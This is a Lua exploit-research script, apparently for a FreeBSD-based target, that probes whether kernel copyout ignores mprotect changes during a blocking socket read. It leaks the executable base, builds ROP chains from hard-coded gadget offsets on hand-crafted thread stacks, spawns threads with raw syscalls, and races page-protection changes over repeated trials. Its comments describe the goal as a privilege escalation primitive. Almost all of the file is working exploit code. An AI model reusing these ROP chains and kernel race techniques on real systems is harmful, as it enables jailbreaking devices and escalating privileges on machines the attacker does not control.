-- CRASH_CLASS: MODERATE
-- PROBE 398f: mprotect(PROT_READ) vs kernel copyout
--
-- 398d/398e proved kernel copyout doesn't re-validate buffer address.
-- Does it also ignore page PROTECTION changes?
-- If kernel writes to a page we mprotect'd to PROT_READ after the blocking
-- call started, it means kernel copyout bypasses user-mode protections.
-- That would be a direct privilege escalation primitive.
--
-- Also test: mprotect to PROT_NONE (no access at all) during blocking recv.

print("=== PROBE 398f: mprotect vs copyout ===")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function w64(addr, lo, hi)
    wd(addr, lo or 0); wd(addr + 4, hi or 0)
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive()
    local ok, v = pcall(function() return native.fcall_with_rax(stub, 20) end)
    return ok and N(v) == pid_val
end

local info = memory.alloc(0x200)
wd(N(info), 0x160)
pcall(function() mk(593)(uint64(0), info) end)
local eb_lo = rd(N(info) + 0x108) or 0
local eb_hi = rd(N(info) + 0x10C) or 0
print(string.format("eb=%X_%08X", eb_hi, eb_lo))

local function g(off)
    return uint64(string.format("0x%X%08X", eb_hi, eb_lo + off))
end
local function g_lohi(off)
    local lo = eb_lo + off; local hi = eb_hi
    if lo >= 0x100000000 then hi = hi + math.floor(lo / 0x100000000); lo = lo % 0x100000000 end
    return lo, hi
end

local pop_rax_ret = g(0x992)
local pop_rdi_ret = g(0xC9DFE)
local pop_rsi_ret = g(0xD77D)
local pop_rdx_ret = g(0x3B02D7)
local pop_rcx_ret = g(0xE64)
local pop_r8_ret  = g(0x991)
local mov_rdi_rax = g(0x92C67)
local bare_ret    = g(0x42)

local sa = memory.alloc(0x40)
for i = 0, 0x3C, 4 do wd(N(sa) + i, 0) end
wq(sa, uint64(1))
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(11), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(10), sa, uint64(0)) end)

local tcb_buf = memory.alloc(0x1000)
for i = 0, 0xFFC, 4 do wd(N(tcb_buf) + i, 0) end
local tcb_mid = N(tcb_buf) + 0x800
wd(tcb_mid, tcb_mid % 0x100000000)
wd(tcb_mid + 4, math.floor(tcb_mid / 0x100000000))
local tcb_ptr = memory.alloc(8)
wq(tcb_ptr, uint64(tcb_mid))

local shared = memory.alloc(0x200)
local sf_lo, sf_hi = g_lohi(0x992)
local CHILD_STK = 0x800

-- ============================================
-- PART A: mprotect baseline
-- ============================================
print("")
print("-- A: mprotect baseline --")

local ok_p, page = pcall(function()
    return mk(477)(uint64(0), uint64(0x4000), uint64(0x3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
local ph, pl = 0, 0
if ok_p and page then ph, pl = get_hi_lo(page) end
local pbase = pl + ph * 0x100000000
if pbase > 0 then
    wd(pbase, 0xAAAA)
    print(string.format("page=%X_%08X val=%08X", ph, pl, rd(pbase) or 0))

    -- mprotect to PROT_READ
    local ok_mp, rv_mp = pcall(function()
        return mk(74)(page, uint64(0x4000), uint64(0x1))
    end)
    print(string.format("mprotect(R)=%d", ok_mp and N(rv_mp) or -999))

    -- Read should work
    local ok_rd, val_rd = pcall(function() return memory.read_dword(pbase) end)
    print(string.format("read_RO=%s val=%08X", tostring(ok_rd), ok_rd and N(val_rd) or 0))

    -- Write should fail
    local ok_wr = pcall(function() memory.write_dword(pbase, 0xBBBB) end)
    print(string.format("write_RO=%s", tostring(ok_wr)))

    -- mprotect to PROT_NONE
    pcall(function() mk(74)(page, uint64(0x4000), uint64(0x0)) end)
    local ok_rd2 = pcall(function() return memory.read_dword(pbase) end)
    print(string.format("read_NONE=%s", tostring(ok_rd2)))

    -- Restore RW
    pcall(function() mk(74)(page, uint64(0x4000), uint64(0x3)) end)
    local ok_rd3, val_rd3 = pcall(function() return memory.read_dword(pbase) end)
    print(string.format("restored=%08X", ok_rd3 and N(val_rd3) or 0))

    pcall(function() mk(73)(page, uint64(0x4000)) end)
end
if not alive() then print("CANARY FAIL A"); return end

-- ============================================
-- PART B: recv on RW page + mprotect to READ + write trigger
-- Does kernel copyout bypass the protection change?
-- ============================================
print("")
print("-- B: recv + mprotect(R) race --")

local tests = {
    {prot = 0x1, name = "PROT_READ"},
    {prot = 0x0, name = "PROT_NONE"},
}

for _, test in ipairs(tests) do
    print(string.format("  test: %s", test.name))

    -- Fresh socketpair
    local spbuf = memory.alloc(16)
    wd(N(spbuf), 0xFFFF); wd(N(spbuf)+4, 0xFFFF)
    pcall(function() mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(spbuf))) end)
    local sr = rd(N(spbuf)) or -1
    local sw = rd(N(spbuf) + 4) or -1
    if sr < 0 then print("  socketpair fail"); break end

    -- Map victim page (RW)
    local ok_vp, vpage = pcall(function()
        return mk(477)(uint64(0), uint64(0x4000), uint64(0x3),
            uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    end)
    local vph, vpl = 0, 0
    if ok_vp and vpage then vph, vpl = get_hi_lo(vpage) end
    if vph == 0 and vpl == 0 then
        pcall(function() mk(6)(uint64(sr)) end)
        pcall(function() mk(6)(uint64(sw)) end)
        print("  mmap fail"); break
    end
    local vpbase = vpl + vph * 0x100000000
    -- Fill with sentinel
    for i = 0, 0x3FFC, 4 do wd(vpbase + i, 0xDDDDDDDD) end

    -- Child: sysarch + read(sr, vpage, 0x100) — blocks
    local cs = memory.alloc(0x1000)
    for i = 0, 0xFFC, 4 do wd(N(cs) + i, 0) end
    local cb = N(cs)
    local cr = ((cb + CHILD_STK) - ((cb + CHILD_STK) % 16)) - 8
    local sp = cr
    local function push(val) wq(sp, val); sp = sp + 8 end

    push(uint64(165))
    push(pop_rdi_ret); push(uint64(129))
    push(pop_rsi_ret); push(uint64(N(tcb_ptr)))
    push(pop_rdx_ret); push(uint64(0))
    push(pop_rcx_ret); push(uint64(0))
    push(stub)

    push(pop_rax_ret); push(uint64(3))
    push(pop_rdi_ret); push(uint64(sr))
    push(pop_rsi_ret); push(vpage)
    push(pop_rdx_ret); push(uint64(0x100))
    push(pop_rcx_ret); push(uint64(0))
    push(stub)

    push(pop_rdi_ret); push(uint64(N(shared) + 0x10))
    push(mov_rdi_rax)

    push(pop_rdi_ret); push(uint64(N(shared)))
    push(pop_rax_ret); push(uint64(0xFFFF))
    push(mov_rdi_rax)

    push(pop_rax_ret); push(uint64(431))
    push(pop_rdi_ret); push(uint64(0))
    push(stub)

    wd(N(shared), 0)
    wd(N(shared) + 0x10, 0xFF)

    -- Launch child
    local pa = memory.alloc(0x38)
    for i = 0, 0x34, 4 do wd(N(pa) + i, 0) end
    w64(N(pa), sf_lo, sf_hi)
    w64(N(pa) + 0x10, cb % 0x100000000, math.floor(cb / 0x100000000))
    w64(N(pa) + 0x18, CHILD_STK, 0)
    pcall(function() mk(455)(uint64(N(pa)), uint64(0x38)) end)

    -- Wait for child to block in read
    local dummy = 0
    for i = 1, 50000 do dummy = dummy + 1 end

    -- ★ Change protection while child is blocked
    local ok_mp2, rv_mp2 = pcall(function()
        return mk(74)(vpage, uint64(0x4000), uint64(test.prot))
    end)
    print(string.format("  mprotect=%d", ok_mp2 and N(rv_mp2) or -999))

    -- Trigger: write data to socket
    local trigger = memory.alloc(16)
    wd(N(trigger), 0xFACEFACE)
    wd(N(trigger)+4, 0xCAFEBABE)
    pcall(function() mk(4)(uint64(sw), uint64(N(trigger)), uint64(8)) end)

    -- Wait for child
    for i = 1, 100000 do dummy = dummy + 1 end

    local child_done = rd(N(shared)) or 0
    local recv_ret = rd(N(shared) + 0x10) or 0xFF

    -- Restore protection to read the page
    pcall(function() mk(74)(vpage, uint64(0x4000), uint64(0x3)) end)

    -- Check what's on the page
    local d0 = rd(vpbase) or 0
    local d1 = rd(vpbase + 4) or 0
    print(string.format("  done=%X recv=%d data=%08X %08X", child_done, recv_ret, d0, d1))

    local wrote_through = (d0 == 0xFACEFACE and d1 == 0xCAFEBABE)
    local kept_sentinel = (d0 == 0xDDDDDDDD)
    if wrote_through then
        print(string.format("  ★★★ KERNEL WROTE THROUGH %s! ★★★", test.name))
    elseif kept_sentinel then
        print(string.format("  sentinel intact — kernel respected %s (EFAULT)", test.name))
    else
        print(string.format("  unexpected: %08X %08X", d0, d1))
    end

    -- Was recv's return value a negative (EFAULT)?
    -- On FreeBSD, EFAULT = 14. recv returns -1 and sets errno.
    -- But we store the raw syscall return which is -1 for EFAULT.
    if recv_ret == 0 or recv_ret == 0xFF then
        print(string.format("  recv unusual: %d", recv_ret))
    end

    pcall(function() mk(73)(vpage, uint64(0x4000)) end)
    pcall(function() mk(6)(uint64(sr)) end)
    pcall(function() mk(6)(uint64(sw)) end)

    if not alive() then print("CANARY FAIL B " .. test.name); return end
end

-- ============================================
-- PART C: Multiple iterations of PROT_READ race
-- to check for intermittent bypass
-- ============================================
print("")
print("-- C: PROT_READ race x10 --")

local bypass_count = 0
local efault_count = 0

for iter = 1, 10 do
    local spb = memory.alloc(16)
    wd(N(spb), 0xFFFF); wd(N(spb)+4, 0xFFFF)
    pcall(function() mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(spb))) end)
    local sr2 = rd(N(spb)) or -1
    local sw2 = rd(N(spb) + 4) or -1
    if sr2 < 0 then break end

    local ok_v2, vp2 = pcall(function()
        return mk(477)(uint64(0), uint64(0x4000), uint64(0x3),
            uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    end)
    local v2h, v2l = 0, 0
    if ok_v2 and vp2 then v2h, v2l = get_hi_lo(vp2) end
    if v2h == 0 and v2l == 0 then
        pcall(function() mk(6)(uint64(sr2)) end)
        pcall(function() mk(6)(uint64(sw2)) end)
        break
    end
    local v2base = v2l + v2h * 0x100000000
    for i = 0, 0x3FFC, 4 do wd(v2base + i, 0xEEEEEEEE) end

    -- Child read chain
    local cs2 = memory.alloc(0x1000)
    for i = 0, 0xFFC, 4 do wd(N(cs2) + i, 0) end
    local cb2 = N(cs2)
    local cr2 = ((cb2 + CHILD_STK) - ((cb2 + CHILD_STK) % 16)) - 8
    sp = cr2

    push(uint64(165))
    push(pop_rdi_ret); push(uint64(129))
    push(pop_rsi_ret); push(uint64(N(tcb_ptr)))
    push(pop_rdx_ret); push(uint64(0))
    push(pop_rcx_ret); push(uint64(0))
    push(stub)

    push(pop_rax_ret); push(uint64(3))
    push(pop_rdi_ret); push(uint64(sr2))
    push(pop_rsi_ret); push(vp2)
    push(pop_rdx_ret); push(uint64(0x100))
    push(pop_rcx_ret); push(uint64(0))
    push(stub)

    push(pop_rdi_ret); push(uint64(N(shared) + 0x10))
    push(mov_rdi_rax)

    push(pop_rdi_ret); push(uint64(N(shared)))
    push(pop_rax_ret); push(uint64(0xCC00 + iter))
    push(mov_rdi_rax)

    push(pop_rax_ret); push(uint64(431))
    push(pop_rdi_ret); push(uint64(0))
    push(stub)

    wd(N(shared), 0)

    local pa2 = memory.alloc(0x38)
    for i = 0, 0x34, 4 do wd(N(pa2) + i, 0) end
    w64(N(pa2), sf_lo, sf_hi)
    w64(N(pa2) + 0x10, cb2 % 0x100000000, math.floor(cb2 / 0x100000000))
    w64(N(pa2) + 0x18, CHILD_STK, 0)
    pcall(function() mk(455)(uint64(N(pa2)), uint64(0x38)) end)

    local dummy2 = 0
    for i = 1, 30000 + iter * 5000 do dummy2 = dummy2 + 1 end

    -- mprotect to read-only
    pcall(function() mk(74)(vp2, uint64(0x4000), uint64(0x1)) end)

    -- Trigger
    local trig = memory.alloc(16)
    wd(N(trig), 0xBEEF0000 + iter)
    pcall(function() mk(4)(uint64(sw2), uint64(N(trig)), uint64(4)) end)

    for i = 1, 100000 do dummy2 = dummy2 + 1 end

    pcall(function() mk(74)(vp2, uint64(0x4000), uint64(0x3)) end)
    local d0 = rd(v2base) or 0
    if d0 == 0xBEEF0000 + iter then
        bypass_count = bypass_count + 1
    elseif d0 == 0xEEEEEEEE then
        efault_count = efault_count + 1
    end

    pcall(function() mk(73)(vp2, uint64(0x4000)) end)
    pcall(function() mk(6)(uint64(sr2)) end)
    pcall(function() mk(6)(uint64(sw2)) end)

    if not alive() then print("CANARY FAIL C iter " .. iter); break end
end

print(string.format("PROT_READ bypass=%d efault=%d", bypass_count, efault_count))
if bypass_count > 0 then
    print("★★★ KERNEL IGNORES MPROTECT DURING COPYOUT ★★★")
end

print("")
print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 398f COMPLETE ===")
